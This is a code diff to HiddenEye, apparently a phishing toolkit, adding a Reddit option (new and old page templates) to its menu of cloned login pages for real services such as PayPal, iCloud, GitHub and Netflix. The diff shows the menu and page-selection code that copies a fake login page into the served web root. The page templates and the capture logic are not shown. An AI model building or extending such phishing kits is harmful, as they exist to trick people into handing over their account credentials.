@@ -118,6 +118,10 @@ def runPhishing(page , customOption): #Phishing pages selection menu
         copy_tree("WebPages/verizon/", "Server/www/")
     elif page == 'Yandex':
         copy_tree("WebPages/yandex/", "Server/www/")
+    elif customOption == '1' and page == 'Reddit':
+        copy_tree("WebPages/Reddit/", "Server/www/")
+    elif customOption == '2' and page == 'Reddit':
+        copy_tree("WebPages/Reddit-old/", "Server/www/")
 
     else:
        endMessage()
@@ -281,8 +285,9 @@ def mainMenu():
     print (_(" {0}[{1}4{0}]{1} GitHub          {0}[{1}13{0}]{1} Steam          {0}[{1}22{0}]{1} Quora          {0}[{1}31{0}]{1} PayPal").format(MAIN0, MAIN2))
     print (_(" {0}[{1}5{0}]{1} StackOverflow   {0}[{1}14{0}]{1} VK             {0}[{1}23{0}]{1} PornHub        {0}[{1}32{0}]{1} Shopify").format(MAIN0, MAIN2))
     print (_(" {0}[{1}6{0}]{1} WordPress       {0}[{1}15{0}]{1} iCloud         {0}[{1}24{0}]{1} Adobe          {0}[{1}33{0}]{1} Verizon").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}7{0}]{1} Twitter         {0}[{1}16{0}]{1} GitLab         {0}[{1}25{0}]{1} Badoo          {0}[{1}34{0}]{1} Yandex").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}8{0}]{1} Instagram       {0}[{1}17{0}]{1} Netflix        {0}[{1}26{0}]{1} CryptoCurrency ").format(MAIN0, MAIN2))
+    print (_(" {0}[{1}7{0}]{1} Twitter         {0}[{1}16{0}]{1} GitLab         {0}[{1}25{0}]{1} Badoo          {0}[{1}34{0}]{1} Yandex").format(MAIN0, MAIN2))                 
+
+    print (_(" {0}[{1}8{0}]{1} Instagram       {0}[{1}17{0}]{1} Netflix        {0}[{1}26{0}]{1} CryptoCurrency {0}[{1}35{0}]{1} Reddit").format(MAIN0, MAIN2))
     print (_(" {0}[{1}9{0}]{1} Snapchat        {0}[{1}18{0}]{1} Origin         {0}[{1}27{0}]{1} DevianArt      ").format(MAIN0, MAIN2))
     option = input(_("{0}HiddenEye >>>  {1}").format(MAIN0, MAIN2))
     if option == '1':
@@ -421,6 +426,10 @@ def mainMenu():
         loadModule('Yandex')
         customOption = ''
         runPhishing('Yandex', customOption)
+    elif option == '35':
+        loadModule('Reddit')
+        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2))
+        runPhishing('Reddit', customOption)
 
     else:
         endMessage()
